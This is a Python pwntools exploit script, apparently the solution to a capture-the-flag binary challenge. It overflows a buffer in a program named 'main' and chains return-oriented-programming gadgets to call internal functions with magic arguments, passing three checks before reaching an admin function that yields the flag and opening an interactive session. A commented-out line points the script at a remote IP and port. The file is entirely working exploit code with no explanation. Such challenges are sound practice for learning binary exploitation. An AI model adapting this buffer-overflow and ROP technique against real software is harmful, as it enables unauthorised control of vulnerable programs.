from pwn import *

context.binary = elf = ELF("./main")

gdbscript = """
init-gef
continue
"""

#p = gdb.debug(elf.path, gdbscript=gdbscript)
p = process()
#p = remote("143.110.187.156", 49001)

rop = ROP(elf)
RET = rop.find_gadget(['ret'])[0]
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]


#bypass 1 & 2
payload = flat(
    cyclic(40),
#    RET,
    POP_RDI,
    p64(0xded53c),
    POP_RSI,
    p64(0xb100d),
    elf.sym['user_home_page'],
#    elf.sym['entry'],
)
p.sendline(b"admin")
p.sendline(payload)

#bypass 3
payload = flat(
    cyclic(24),
#    RET,
    POP_RDI,
    p64(0xdeadbeef),
    elf.sym['user_info'],
    elf.sym['entry']
)
p.sendline(payload)

#call flag
payload = flat(
    cyclic(24),
    RET,
    elf.sym['admin_home'],
)
p.sendline(payload)

p.interactive()
